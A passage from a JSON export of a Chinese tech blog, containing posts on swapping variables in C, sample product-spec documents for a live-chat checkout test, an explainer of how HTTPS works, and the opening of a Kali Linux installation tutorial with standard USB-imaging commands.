a-b;\na=a-b;\n```\n\n分析，设a和b的原始值为 a，b。\n\n| 执行代码 | 变量a | 变量b |\n| --- | --- | --- | \n| int a, b | a | b |\n| a = a+b | a+b | b |\n| b = a-b | a+b | a+b-b = a |\n| a = a-b | a+b-(b) = a+b-a = b | a |\n\n\n2.2、 方法二：异或运算\n\n异或运算符 `^` 也称 `XOR` 运算符，它的规则是若参加运算的两个二进位同号，则结果为0（假）；异号为1（真）。即 `0 ^ 0 = 0, 0 ^ 1 = 1, 1 ^ 0 = 1, 1 ^ 1 = 0` 。\n\n```c\nint a, b;\na = a^b;\nb = a^b;\na = a^b;\n```\n\n分析，前两个赋值语句：`a = a ^ b;` 和 `b = b ^ a;` 相当于 `b = b ^ (a ^ b)`，而 `b ^ a ^ b` 等于 `a ^ b ^ b` 。`b ^ b` 的结果为0，因为同一个数与相同的数相 `^` ，结果必为 0。因此b的值等于 `a ^ 0`，即 `a` 。  \n再执行第三个赋值语句：`a = a ^ b`。由于 a 的值等于 `(a ^ b)`，`b` 的值等于 `(b ^ a ^ b)`，因此，相当于 `a = a ^ b ^ b ^ a ^ b` ，即 a 的值等于 `a ^ a ^ b ^ b ^ b` ，等于 `b`。\n\n或者用列表方式分析。设 a 和 b 的原始值为 a1，b1。\n\n|目标 | 操作 | 操作后状态 |\n| --- | --- | --- | \n| a = a1 ^ b1 | a = a ^ b | a = a1 ^ b1, b = b1 |\n| b = a1 ^ b1 ^ b1 | b = a ^ b | a = a1 ^ b1, b = a1 |\n| a = b1 ^ a1 ^ a1 | a = a ^ b | a = b1, b = a1 |\n\n## 注意\n\n> 问题：用加减运算的时候要注意不要溢出，用异或运算的时候，不要两个相同的数进行交换。\n\n## 参考\n\n[CSDN-不引入第三变量，交换两个变量的值](http://blog.csdn.net/ysdaniel/article/details/6617495)\n\n","categories":["面试"],"tags":["算法","面试"]},{"title":"示例思路笔记","url":"/2018/02/2018-02-21-product-example-notes/","content":"\n\n> 这是一篇示例产品文档思路笔记，是[「产品文档撰写指南」](/文档指南/2018/02/21/on-writing-product-specs.html)的一部分。建议阅读时间 2 分钟。\n\n<!-- more -->\n\n## 问题：\n\n* 转化率糟透了，只有18%，应该可以被提升至30%（需要详细数据支持）。\n\n* 还能尝试什么方法来提高转化率，是否还值得继续投入呢？需要先看一下以往的用户反馈总结和用户调研结果。\n\n## 目标：\n\n* 证明在线客服是有用的。如果测试结果不理想也别抓狂，失之我命。\n\n* 最好能在十二月初确定结论，这样就可以申请 Q1 的人力支持。\n\n## 聊天服务提供商？\n\n* 从最有名的几个中挑一个出来：Olark，SnapEngage 等等\n\n* 这些服务的界面长得怎么样，可以以及必须自定义多少界面元素？\n\n* 需要可以让客服团队不改一行代码，就能够设置他们的在线时间及虚拟形象。\n\n* 集成服务的成本是怎样的？仅仅加一段 JavaScript 代码就可以，还是……？\n\n* 我们可以从服务提供商获得多少数据报告？如果是我们自己做数据分析的话需要做什么准备？\n\n* 可以在聊天服务中加入一些自定义的变量来帮助我们分析数据么？例如 用户 ID?\n\n* 是否可以先不管现有 Zendesk 中现有工单的迁移？\n\n## 如何衡量成功：\n\n* 需要衡量：一个聊天客服的成本，一个客服可以完成多少次在线聊天，以及这些聊天可以带来多少新的转化。\n\n* 如果项目结束后拿不到这些数据，这个测试就白做了。\n\n* 一定要从客服主管和财务人员那里尽早获得反馈。\n\n## 推进测试：\n\n* 需要对多少流量进行测试？应该通过这几个指标计算得出：点击聊天的用户数，单个聊天的平均耗时，同时进行的聊天并发数，平均等待时长等等\n\n* 这个数据倒是可以算出来，但是考虑到现在只有一堆假设没有任何数据，并不值得真正去算。\n\n* 所以我们拍脑袋先定 20% 的流量用于测试，然后根据实际情况进行调整吧。\n\n* 这个测试需要多少天呢？是否需要考虑季节性的流量波动？\n\n## 需要什么样的数据报告？\n\n* 我想了解测试组和对照组的转化率，营收，以及订单总量。\n\n* 以及此次测试实际影响到的人数（开启聊天的人数）。\n\n## 还有什么?\n\n* 是否考虑国际化的问题？我觉得现在还是先不考虑比较好。\n\n* 移动设备？你懂的，现在30%的交易量都来自于移动端.\n\n* 网页加载时间？务必保证聊天窗口不要拖慢整个网页的加载速度！\n\n---\n\n继续阅读 [示例产品文档](/文档指南/2018/02/21/product-example-spec.html) \n\n## 来源\n\n[示例思路笔记——不安静的书桌](https://mp.weixin.qq.com/s?__biz=MjM5MTIzMjgwMg==&mid=2247483676&idx=2&sn=33c24e5d7a7a25edec64f19a9b3a616d&chksm=a6b9e75191ce6e4752ade268a601fb06abd6279b04f5269052102d894f6eac0d44b4554a0ba6#rd)","categories":["文档指南"],"tags":["产品文档","文档指南"]},{"title":"示例产品文档","url":"/2018/02/2018-02-21-product-example-spec/","content":"\n> 这是一个示例产品文档，是[「产品文档撰写指南」](/文档指南/2018/02/21/on-writing-product-specs.html)的一部分。建议阅读时间 6 分钟。\n\n<!-- more -->\n\n说明：\n\n> 引用格式的文字是我的注释。\n第一次阅读此文档时请忽略注释部分通读此文，然后再回到文初重新阅读所有内容。\n所有的超链接并没有链接到任何地方。这篇文章中的外链就只是表明有一些待办事项和相关文档。\n\n# 在支付时增加在线客服\n\n*由 Gaurav Oberoi 撰写 。最后更新日期：2016年9月28日。*\n\n这个项目的目标是通过在支付页面增加在线对话客服来提高支付转化率。这是一个为期 30 天的测试，测试完成后我们可能会上线或者关掉这个功能（薛定谔的客服？蛤蛤）。\n\n> 用不超过两行文字描述此项目。我所说的「行」是指你的客户端的默认阅读宽度（例如 Google Docs、维基、文本文件等）。坚持字数限制是可读性的关键所在。\n\n## 概览\n\n### 问题\n\n1. **支付转化率过低：**只有 18% 的点击了「预订」按钮的用户完成了支付。竞品预订网站可以达到约 30% 的转化率（数据来源）。我们正在失去收入！\n\n2. **没有明确的流失原因：**之前的工单和用户调查给出了一系列非常多可能的原因（易用性、支付费用、支付耗时方面的问题），也没有明确的分类。\n\n3. **增加帮助文档的内容并没有起到作用：**上个季度，我们 对帮助文档和预定信息的内容及界面设计做了 A/B 测试。这只带来了 1.5% 的转化率轻微提升。\n\n> 我强烈建议使用列表来增强文档的可读性。\n使用粗体文字快捷指出每行文字的要点，并且限制列表在两三行以内。\n我更喜欢有序列表，因为这样在口头沟通时很容易指示清楚。\n\n### 目标\n\n1. **测试客服聊天是否可以明显地提高转化率：**每天新增超过 90 个订单就能打平在线客服的运营成本，现在还不清楚是否能做到这一点。这是一次测试！\n\n2. **降低测试成本：**避免所有的过度优化，如果测试成功，在 Q1 我们就可以优化在线聊天的体验了。\n\n3. **在 12 月 1 日前确定最终的结果：**在开始做 Q1 计划前，我们还有 8 周时间。\n\n> 确保文档可以提出一个明确的目标，这个目标应当是非常容易判断「达成目标了么？」的。\n在文档中做出明确的承诺。\n\n### 不应考虑的问题\n\n1. **重要的界面修改：**只增加一个可见的聊天按钮，不做任何其他的设计改动。\n\n2. **确定聊天服务供应商：**目前而言先使用 SnapEngage，如果测试成功了，再考虑长期的服务供应商。\n\n3. **国际化和非英语用户：**为了简化处理，此次测试仅针对美国地区及其他英语用户。\n\n> 这部分用来排除种种不利的假设，树立正确的项目预期。\n\n### 团队成员和角色划分\n\n1. **Heather（用户运营经理）：**批准客服资源需求。\n\n2. **Randy（用户运营专员）：**负责处理用户反馈，每周整理反馈总结。\n\n3. **Colin（工程师）：**开发和测试。也要负责配置 SnapEngage，并且给我们展示一下设置方法。\n\n4. **Kalpana（财务）：**在测试阶段以及后续时间负责评审我的盈利预算。\n\n5. **Joha（设计师）：**花一点时间看一下我们在设计上的改动，没有大块的设计需求。\n\n6. **Vikram（数据分析师）：**确保我们能按时拿到此次测试的数据报告。\n\n> 帮助大家明确项目成员及对每一个人的期望。\n仅包括将会执行这件事情的人，和对这件事情有通过/否决权力的人。\n\n## 需求背景\n\n> 这里应当包含了解当前问题以及解决方案所需要的所有背景信息。\n添加任何你认为应该出现在这里的内容，例如：用例、用户模型、数据指标、竞品解决方案、调研结果等等。\n\n### 用例\n\n1. **用户需求：**  \na. **在 2 分钟内获得帮助：**不确定是否可以实现，但是我们先冲着这个目标去努力吧。  \nb. **适配移动端及桌面端：**有 28% 的支付是在手机上完成的，所以移动端适配很重要。  \n\n2. **用户运营团队需求：**  \na. **有反馈队列的客服后台：**在桌面/web 端就可以，不需要支持移动端  \nb. **增删客服人员：**可自助完成，而不需要开发人员支持  \nc. **设置在线时间：**可以控制网站上的在线聊天按钮是否可见。  \nd. **查看用户信息：**需要传递用户 ID 的参数给后台，方便客服人员查找当前用户信息。  \ne. **给会话打标签：**在聊天结束后，可以在注释字段中记录一些非结构化的文本信息。  \n\n### 假设\n\n1. **每天增加90个付费订单，可以打平一个客服人员的运营成本：**根据每个客服人员的成本以及一个支付用户的 LTV（生命周期价值）。详见表格。\n\n2. **一个客服人力可以支持 20% 的支付流量：**基于对等待时间、聊天时长、并发聊天数量的一系列假设。我们没有数据能支持做出靠谱的假设，所以拍脑袋定一个数据，并且需要我们的系统支持快速增加/降低测试流量。\n\n3. **支付转化率应该从18%增加到20％：**总转换率不需要增加特别多就已经意味着测试成功了。在这里查看我们的分析报告。\n\n## 解决方案\n\n> 用你能做到的最自然的方式描述你的方案。\n需要做到清晰、条理清楚、合理分段。\n根据不同项目的特点，你也可以加入： 线框图，用户流程图，表单输入/验证逻辑，数据模型……等执行该计划所需要的所有细节。\n\n### 在线客服供应商\n\n我选择了 SnapEngage ，符合我们的既定用例并且价格便宜（$60/月）。注：如果测试成功，我们会再选择适当的供应商 。我已经注册了一个付费账户，帐号密码在我们的密码管理工具中。\n\n### 用户体验\n\n通过 SnapEngage 的文档 来弄清楚他们这个聊天窗口的弹出逻辑。有以下几点：\n\n1. **按钮：**设置为「立即聊天」的文案，并且放在详情页中「预订」主按钮的旁边\n\n2. **交互：**点击时展示客服姓名，以及「您需要什么帮助？」的文案\n\n3. **所有的支付页面：**它应该在所有的三个付款步骤页面上都展示。\n\n4. **不自动弹出：**我们可以以后再试这个效果，现在先低调上线测试。\n\n### 会话参数\n\n1. **这是什么：**当我们嵌入服务供应商的 Javascript 时，我们可以传入特定的参数。这些参数客服可以看得到，并且也会记录在日志和数据报告里。\n\n2. **传递这些参数：**用户 ID，用户邮箱，浏览器信息，预订 ID，预订订单价格。\n\n### 测试流量开关\n\n只会有部分支付流量看到在线客服功能。下面是我们需要做的工作：\n\n1. **只展示给 X％ 的用户：**我们必须能够在不重新部署的情况下就可以修改 X 的值，但是可以每次修改时都由用户运营团队向工程师提交一个工单来人工修改（例如，将这个值存储在我们的数据库/Redis 中）。\n\n2. **对展示过的用户始终可见：**只要用户看到过一次这个聊天窗口，在测试期间此用户就应该始终可以看到这个功能。可以通过 cookie 来存储这个状态，也可以用这批用户的用户 ID 来记录（例如：如果用户 ID 对 100 取模小于 X，就可以看到此功能）。\n\n3. **流量递增方案：**第一天，我们只开放 5% 的流量用于测试，如果用户运营团队反馈正常，则在第二天开放至 10% 的流量，第三天开放至 20%。\n\n### 数据指标和报告\n\n1. **日志记录：**在现有的指标当中增加：”live_checkout=true/false”。\n\n2. **新的数据报告：**  \na. 对比有在线客服的用户（测试组）和没有在线客服的用户（对照组）的支付转化率。  \nb. 在线客服所带来的总订单数和收入。  \nc. 测试用户中有多少人点击了在线聊天窗口。  \n\n3. **SnapEngage 的数据报告：**可以告诉我们平均会话耗时，以及并发会话数等数据\n\n> 上面我举的例子可能晦涩难懂，但是我们团队中的工程师和数据分析师则会很容易理解——因为他们正是这部分文档的受众。\n记住：写下所有需要人脑执行的必要事项。\n\n### 未来计划\n\n1. **如果我们发现在线聊天的使用率很低：**我们需要尝试一些优化方案，例如：（一）自动弹出聊天窗口，（二）修改聊天按钮样式，（三）在聊天按钮旁边增加客服人员照片。\n\n2. **如果测试验证成功：**我们会争取更多的客服人力，并且在 Q1 进行大规模迭代改进，包括选择合适的供应商，更深入的数据分析，以及正式的客服话术培训。\n\n> 指明项目的未来发展方向永远都是好事，因为这样可以引导人们更长远地去思考。\n\n## 任务和排期表\n考虑到在「未来计划」中提到的问题，这个排期表可能会有一到两周的延期。只要我们能够在 12 月 1 日得到测试结果，我们就在 Q1 人力资源规划时争取到更多的人力。\n\n1. **10 月 4 日：**文档评审。\n\n2. **10 月 8 日：**和客服团队一起在开发环境中测试如何设置客服人员以及客服时间。\n\n3. **10 月 11 日：**上线。我们会在接下来的数天中逐步增加测试流量。\n\n4. **10 月 17 日：**在上线1周后同步信息。在此时我们可能会有一些额外的工作要做。\n\n5. **11 月 12 日：**最后一次沟通，评审当下状态以决定继续推进还是结束此项目。\n\n6. **12 月 1 日：**这是完成此项目并且得到测试结果的最终截止日。\n\n> 开始的时候排期表可以只有一个大致的估期，通过更多的分析来逐步精确时间点（例如需要技术文档）。\n但是尽早尝试拆解和确定时间点，大致框定每项工作的范围和规模仍然是非常重要的。\n工期估算应当来自于 执行方（开发，设计等）。\n\n---\n\n返回阅读[「产品文档撰写指南」](/文档指南/2018/02/21/on-writing-product-specs.html#ihaveread)\n\n## 来源\n\n[示例产品文档——不安静的书桌](https://mp.weixin.qq.com/s?__biz=MjM5MTIzMjgwMg==&mid=2247483676&idx=3&sn=abd943f967c27b116e3223ded3809d8b&chksm=a6b9e75191ce6e471eeae9ed699c21fca2148af760ae7aceec616452a567b5c33108707ba0aa#rd)","categories":["文档指南"],"tags":["产品文档","文档指南"]},{"title":"关于 https","url":"/2018/02/2018-02-26-https/","content":"\n现在打开各大知名网站，你有没有发现地址栏都已经加了个绿色的小锁？  \n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-15-https-egcMVL.png)\n\n是的，这就是https，这就是https的时代。\n\n<!-- more -->\n\n据外媒报道，**谷歌宣布，今年7月起，Chrome浏览器的地址栏将把所有HTTP标示为不安全网站。**这就意味着，任何在加载时不带有Chrome绿色挂锁标志（也就是该浏览器地址栏中用以表示“安全”的标志）的网站都将被标记为不安全的。\n\n**然而，你了解https吗？**\n\n简单来说，https 就是套在 SSL/TLS 内的 http，也就是安全的 http。何为安全？一个安全的网络通信环境要解决3个问题：\n\n1. 通信内容的保密性  \n2. 通信双方身份的真实性  \n3. 通信内容的完整性   \n\n而 https 就是为了解决这3大问题而诞生的（准确来说应该是 ssl），下面分别看看这3个问题的解决方案。\n\n## 通信内容的保密性\n\n通信内容的保密需要通过加密来实现。我们的互联网环境是非常透明的，通信需要经过很多中转才能到接收方手中。这个情形有点像你上课的时候给第一排的小红递纸条一样，纸条上你肯定不会直接写今夜三更操场见，而是机灵地写了老地方见。这个老地方只有你和小红知道，这样就算小明小李看到了纸条，他们也不知道老地方是图书馆还是英语角，这就是加密，而老地方就是所谓的密钥。\n\n当然，这个例子并不是很准确。简单来说，加解密就是一个函数，而密钥则是这个函数的参数。比如我们定义一个简单的加密函数，f(x)=x+b，x 就是输入的明文，而 b 是密钥；解密函数就是加密函数的反函数，也就是 g(x)=x-b。当不知道b的时候，你就算看到了密文也猜不出真实内容，这样就实现了加密。这种加解密都用同一个密钥，叫对称加密。\n\n**但这里有个问题，这里的参数 b 是怎么协商出来的？**\n\n你和小红可以花前月下约好 b 值，但是在真实网络环境中你和小红根本没有直接沟通的可能，所有沟通都要靠小明小李去传纸条的话，怎么做才能躲过他们呢？这里就需要用到非对称加密算法了，这种算法有公钥和私钥一对钥匙，公钥是所有人都能获取到的钥匙，私钥则是服务器私自保存的钥匙。非对称加密算法中公钥加密的内容只能用私钥解密，私钥加密的内容则只有公钥才能解密。所以当你使用小红的公钥加密你的纸条之后，帮你传递纸条小明小李等人看到纸条也无法读取内容了，只有拥有私钥的小红才能读出你的信息。\n\n> 对称加密[算法](https://baike.baidu.com/item/%E7%AE%97%E6%B3%95)在加密和解密时使用的是同一个秘钥；而[非对称加密算法](https://baike.baidu.com/item/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95)需要两个[密钥](https://baike.baidu.com/item/%E5%AF%86%E9%92%A5)来进行加密和解密，这两个秘钥是[公开密钥](https://baike.baidu.com/item/%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5)（public key，简称公钥）和私有密钥（private key，简称私钥）。你可能比较好奇非对称加密算法的原理，但是我这里不展开讲算法，有兴趣的同学可以自行搜索。  \n\n那么问题来了，小红给你的回应也想加密怎么办？如果小红用她的私钥加密的话，班上所有人都知道公钥，而公钥可以解私钥的加密，也意味着所有人都能解密小红的回应消息。聪明的你一定想到了解决方案：**利用非对称加密算法加密出一个对称密钥给小红，小红用她的私钥读取对称密钥，然后你们就用这个对称密钥来做对称加密**，然后就可以愉快地约约约了。\n\n当然，https也是这么干的。\n\n## 通信双方身份的真实性\n\n加密之后貌似通信过程就完美了？且慢，小红的公钥是怎么公告天下的呢？\n要知道在网络环境中所有信息交互都是通过传纸条的方式来进行的，小红的公钥也不例外，万一在经过小明手里的时候被掉包了怎么办？怎么保证你手上的小红公钥是就是真正的小红公钥呢？看到班上的痴男怨女的纸条被各种掉包，文娱委员凤姐决定挺身而出。凤姐想出了一个办法，所有加密通信都要带上一本证，用来证明自己的身份。这本证是凤姐特意为班上所有单身狗做的，公钥就放在证书里面返回给纸条的发送者，证书里面除了公钥还有学号、人名、甚至星座身高三围等各种信息。证书上盖了一个大大的鉴定章，这是凤姐独有的章，表示证上的信息真实性由凤姐保证，看到这个章就可以认为对方是个**真·单身狗**。\n\n通过这些信息你就可以知道对方是小红还是如花了，这就是证书机制。\n\n显然你会怀疑证书上凤姐的公章是有可能被伪造的，怀疑有理！所以证书上的公章也是非对称加密过的，加密方式跟上面提到的刚好相反：用凤姐的私钥加密，用凤姐公钥就可以解密，这样就可以鉴定证书的真伪。这个公章就是证书的数字签名，具体来说就是先将证书用哈希算法提取摘要，然后对摘要进行加密的过程。另外你也可以直接拿着证书去找凤姐，凤姐就会帮你验证证书的有效性。（证书是有期限的，所以即使是真证书也会可能过期，需要注意）\n\n这个机制看起来相当完善，但是我们要以怀疑一切的态度去做安全机制，凤姐保证的东西是可信任的了，但是，凤姐真的是凤姐吗？？？\n\n\n所以，凤姐本身也要由证书来保证，凤姐的证书由班主任颁发，而班主任的证书由校长颁发……这个链一直到最权威的几个机构，这些机构在https体系中就是所谓的根CA。根是不可怀疑的权威，他们为自己带盐，自己证明自己是自己。在https证书体系里面，根证书是操作系统/浏览器自带的，我们可以相信被这些机构认证的证书的，从而一层一层推导到凤姐这个级别。\n\n另外，由于证书其实很容易做，地铁口10块一本，无论哈佛还是斯坦福，统统10块！所以有些公司会自己做证书，根本不去找根 CA 机构，比如著名的12306。你也可以自己做证书放到网上让用户下载导入浏览器，但因为你没有凤姐的影响力，所以没人会相信你，当然也有人连凤姐都不相信……\n\n\n## 通信内容的完整性\n\n密也加了，凤姐也保证了，是不是这套机制就 perfect 了呢？\n\nNoNoNo，想一下暗恋着你的小明看到你给小红传纸条，心里肯定不爽，虽然看不懂但是还是可以改密文呀。本来你是要约小红半夜三更操场见，结果小明删掉了前半部分的密文，解密后恰好变成了“操场见”，然后小红下课马上往操场跑，而你却跑回宿舍好好洗了个澡……然后，然后小红就跟小明跑了。。。\n\n这种篡改通信内容的场景相信大家都深有体会，我们访问一些站点的时候无缘无故就出现了运营商的广告，这都是运营商给加的！！所以内容的完整性也需要保证，这比较简单：先用哈希算法提取内容摘要，然后对摘要进行加密生成数字签名，验证数字签名就可以判断出通信内容的完整性了。\n\n**以上几点就是https用到技术的简化版，结合起来一个http通信流程如下：**\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-14-0-amOlG8.jpeg)\n\n\n**大体步骤：**\n\n1. 客户端发送 Client Hello 报文开始 SSL 通信，报文中包含 SSL 版本、可用算法列表、密钥长度等。  \n2. 服务器支持 SSL 通信时，会以 Server Hello 报文作为应答，报文中同样包括 SSL 版本以及加密算法配置，也就是协商加解密算法。  \n3. 然后服务器会发送 Certificate 报文，也就是将证书发送给客户端。  \n4. 客户端发送 Client Key Exchange 报文，使用3中的证书公钥加密 Pre-master secret 随机密码串，后续就以这个密码来做对称加密进行通信。  \n5. 服务器使用私钥解密成功后返回一个响应提示 SSL 通信环境已经搭建好了。  \n6. 然后就是常规的 http c/s 通信。\n\n\n根据前文所述，在步骤3和步骤6都会使用摘要和签名算法来保证传递的证书和通信内容不被篡改。通过这个流程可以看出，https 的核心在于加密，尤其是非对称加密算法被多次使用来传送关键信息。\n\n**理解了加密，认识到网络的透明性，抱着怀疑一切的态度，理解https这套体系就变得简单了。**\n\n## 关于本站\n\n本站是采用 Coding Pages 部署的 jekyll 网站，Coding Pages 提供给开发者免费便利申请 https 证书的条件，只需要在 Coding Pages 设置页面申请证书，并使用 https 协议即可。\n\n在这里，笔者遇到了一个小问题，本站是在 GitHub 和 Coding 上同时部署的，设置 DNS 解析的时候默认选成了 GitHub Pages，导致申请证书失败，只需要将 DNS 解析修改过来就行了。\n\n\n## 附录：\n\n* **https 如何避免中间人攻击？**  \n\n如果有人劫持了你的 DNS 服务器，将 [http://wwe.icbc.com](http://wwe.icbc.com) 解析到他的非法网站，或者代理服务器将你导向他的非法网站去，这都是中间人攻击。如果没有https，那么攻击就这样发生了。那https怎么避免这类攻击？\n\n答案是通过证书鉴别。\n\n1. 在申请证书的时候 CA 会对所要申请的域名进行控制权认证，所以你是不可能用隔壁老王的网站来申请证书的。就算你黑了他的站点，只要老王去申请证书就能发现了。\n\n2. 如果伪造一个证书，这个证不是权威CA签发的，那么浏览器检查的时候会报警提示用户证书非法。当然用户仍然可以继续操作，比如抢火车票什么的。。\n\n3. 如果你把真正站点的证书搞下来，证书上的域名不变，只是将公钥替换掉，那么浏览器比对证书数字签名的时候就能发现对不上了，二话不说，报警。\n\n4. 如果中间人直接用 www.icbc.com 的真实证书，那么他虽然能收到客户端的消息，但是无法解密，所以也无法响应客户端的请求，攻击无效！\n\n* **证书的数字签名**\n\n之前对哈希算法和数字签名了解不多，了解之后发现其实原理还是挺简单的。哈希算法可以将大量的数据转换成定长的摘要，而且摘要是与输入对应的，输入变化后摘要也会发生变化。所以对数据应用哈希算法求出摘要，比对摘要就可以判断数据是否被篡改过了。证书使用了私钥加密摘要，然后客户端就可以用公钥解密得到摘要，对比哈希算法算出来的摘要就可以判断证书是否被篡改过。另一方面，因为公私钥是成对的，篡改后的证书虽然能求出摘要，但是无法加密出签名，所以摘要和加密组合使用就可以保证证书的真实性了。这里的私钥是证书的发证机构的私钥，也就是 CA 链上 CA 加密用户服务器证书，上级 CA 加密下级 CA 的证书，从而形成一个信任环。\n\n","categories":["技术"],"tags":["HTTPS"]},{"title":"Kali Linux 实战教程（一） —— 安装 Kali Linux","url":"/2018/03/2018-03-01-kali-001/","content":"\n本节教程讲解了如何在物理机和虚拟机上安装 Kali Linux 系统，以及解决一些常见的问题\n\n> **多图预警！多图预警！多图预警！** 重要的话说三遍！！！\n\n<!-- more -->\n\n如今 Linux 的安装过程已经非常“傻瓜”化，只需要轻点几下鼠标，就能够完成整个系统的安装。Kali Linux 操作系统的安装也非常简单。本节将分别介绍安装 Kali Linux 至硬盘、USB 驱动器、树莓派、VMware Workstation 和 VMWare Tods 的详细过程。\n\n## 1.安装到硬盘\n\n安装到硬盘是最基本的操作之一。该工作的实现可以让用户不使用 DVD，而正常的运行 Kali Linux。在安装这个全新的操作系统之前，需要做一些准备工作。例如，从哪里得到 Linux？对电脑配置有什么要求？……下面将逐一列出这些要求。\n\n### 对电脑配置要求\n\nKali Linux 安装的磁盘空间的最小值是 8GB。为了便于使用，这里推荐至少 25GB 去保存附加程序和文件。\n内存最好为 512MB 以上。\n\n### 下载\n\nKali Linux的下载地址 [http://www.kali.org/downloads/](http://www.kali.org/downloads/) ，也可以去国内的镜像源站点去下载。官方下载界面如图所示。\n\n![download](https://up-img.yonghong.tech/pic/2021/07/29-16-17-download-z7YS26.png)\n\n该官方网站提供了 32 位和 64 位各种 ISO 文件。本教程以 **Kali Linux 64 bit 2018.1** 为例来讲解安装和使用。下载完 ISO 文件后，将该映像文件刻录到一张 DVD 光盘或者 U 盘上。接下来就可以着手将 Kali Linux 安装至硬盘中了。\n\n### 制作安装盘\n\n这里介绍如何在 macOS 系统中刻录一个 Kali Linux 安装 U 盘。\n\n1.首先将 iso 文件装换为 img 镜像文件，macOS 会自动加 dmg 后缀名，不影响\n\n\n```shell\nhdiutil convert -format UDRW -o 目标文件夹/kali.img 源文件目录/kali-linux-2018.1-amd64.iso\n```\n\n2.找到U盘盘符\n\n\n```shell\ndiskutil list\n```\n\n3.卸载U盘\n\n\n```shell\ndiskutil unmountDisk /dev/disk2\n```\n`/dev/disk2` 是U盘盘符，有可能是 `disk2` 或 `disk3`\n\n4.写入镜像\n\n\n```shell\nsudo dd if=目录/kali.img.dmg of=/dev/rdisk2 bs=1m\n```\n\n将转换好的img镜像写入U盘\n\n### 安装\n\n这里为了方便使用了虚拟机安装时的截图，实际与物理机安装是相同的\n\n1. 插入安装 U 盘，选择 U 盘启动，出现如下画面，选择 Graphical Install（图形化安装）  \n![start](https://up-img.yonghong.tech/pic/2021/07/29-16-19-pic_5-L1DaLT.png)\n\n1. 选择语言，我建议选择 English，因为 Linux 系统目录中出现中文是一个比较麻烦的事情，所以我建议选择英文，对以后的深入研究也做一个铺垫  \n![language](https://up-img.yonghong.tech/pic/2021/07/29-16-19-pic_6-GVLDig.png)\n\n1. location 随便选就行，如果有强迫症非要选 China，那么在 other->Asia->China   \n![location](https://up-img.yonghong.tech/pic/2021/07/29-16-19-pic_7-gFUUIh.png)\n\n1. 语言编码，英语 UTF-8  \n![utf-8](https://up-img.yonghong.tech/pic/2021/07/29-16-19-pic_8-9V8S0q.png)\n\n1. 键盘默认  \n![keboard](https://up-img.yonghong.tech/pic/2021/07/29-16-28-pic_10-Bb2CXG.png)\n\n1. 该界面用来设置系统的主机名，这里使用默认的主机名Kali（用户也可以输入自己系统的名字）。这里的名字会显示在命令行中 ，如 `root@monster:` 当然这个在之后也可以自己改  \n![host](https://up-img.yonghong.tech/pic/2021/07/29-16-28-pic_11-L2bEYy.png)\n\n1. 该界面用来设置计算机所使用的域名。如果当前计算机没有连接到网络的话，可以不用填写域名，直接单击“继续”按钮。  \n![domain](https://up-img.yonghong.tech/pic/2021/07/29-16-28-pic_12-vFo6cp.png)\n\n\n1. 设置 root 用户密码  \n![passwd](https://up-img.yonghong.tech/pic/2021/07/29-16-29-pic_13-wMTZwI.png)\n\n1. 该界面供用户选择分区。这里选择“use entire disk（使用整个磁盘）”，然后单击“继续”按钮，  \n![disk](https://up-img.yonghong.tech/pic/2021/07/29-16-29-pic_14-5MrsQy.png)\n\n1.  该界面用来选择要分区的磁盘。该系统中只有一块磁盘，所以这里使用默认磁盘就可以了。如果是 U 盘安装应该会显示硬盘和 U 盘两个，注意不要选错  \n![disk](https://up-img.yonghong.tech/pic/2021/07/29-16-29-pic_15-CzXUQ5.png)\n\n1.  该界面要求选择分区方案，默认提供了三种方案。这里选择“All files in one partition(recommended for new users)（将所有文件放在同一个分区中（推荐新手使用））”  \n![partition](https://up-img.yonghong.tech/pic/2021/07/29-16-29-pic_16-v61HZ8.png)\n\n1.  在该界选择“Finish partitoning and write changes to disk（分区设定结束并将修改写入磁盘）”，然后单击“继续”按钮  \n![confirm](https://up-img.yonghong.tech/pic/2021/07/29-16-29-pic_17-gwDC2r.png)\n\n1.  在该界面选择“是”复选框，然后单击“继续”按钮  \n![confirm](https://up-img.yonghong.tech/pic/2021/07/29-16-30-pic_18-3NcmiN.png)\n\n1.  现在就开始安装系统了。在安装过程中需要设置一些信息，如设置网络镜像，如图1.15所示。如果安装Kali Linux系统的计算机没有连接到网络的话，在该界面选择“否”复选框，然后单击“继续”按钮  \n![netmirror](https://up-img.yonghong.tech/pic/2021/07/29-16-30-pic_19-skl3Lv.png)\n\n1.  将GRUB启动引导器安装到主引导记录（MBR）上吗？在该界面选择“是”复选框，然后单击“继续”按钮  \n![mbr](https://up-img.yonghong.tech/pic/2021/07/29-16-30-pic_20-bzqygK.png)\n\n1.  选择/dev/sda  \n![mbr](https://up-img.yonghong.tech/pic/2021/07/29-16-31-pic_21-0uRjZh.png)\n\n1.  安装完成，拔掉 u 盘，重启。有些电脑在关机或者是重启的时候会卡住不动，直接重启即可，以后我们会解决这个问题。  \n![finish](https://up-img.yonghong.tech/pic/2021/07/29-16-31-pic_22-HfORYZ.png)\n\n\n## 2.安装到虚拟机\n\n接下来简单说说如何安装在虚拟机上，主要是两个软件，一个是常常用在 Windows 上的 VMware Workstation，一个是常常用在 macOS 上的 Parallel Desktop。\n\n### 在 VMware Workstation 上安装 Kali\n\nVMware Workstation是一款功能强大的桌面虚拟计算机软件。它允许用户在单一的桌面上同时运行不同的操作系统。用户在其中可以进行开发、测试和部署新的应用程序。\n\n废话少说，我们开始\n\n1. 启动VMware Workstation，将显示如图所示  \n![start](https://up-img.yonghong.tech/pic/2021/07/29-16-31-pic_23-Ssniat.jpeg)\n\n1. 在该界面单击“创建新的虚拟机”图标  \n![新建虚拟机向导](https://up-img.yonghong.tech/pic/2021/07/29-16-32-pic_24-2t5GCO.jpeg)\n\n1. 该界面选择安装虚拟机的类型，包括“典型”和“自定义”两种。这里推荐使用“典型”的方式，然后单击“下一步”按钮    \n![安装客户机操作系统](https://up-img.yonghong.tech/pic/2021/07/29-16-32-pic_25-mJYenm.jpeg)\n\n1. 该界面用来选择如何安装客户机操作系统。这里选择“稍后安装操作系统”，然后单击“下一步”按钮  \n![选择客户机操作系统](https://up-img.yonghong.tech/pic/2021/07/29-16-32-pic_26-iEZtJM.jpeg)\n\n1. 在该界面选择要安装的操作系统和版本。这里选择Linux操作系统，版本为其他Linux 2.6.X内核，然后单击“下一步”按钮  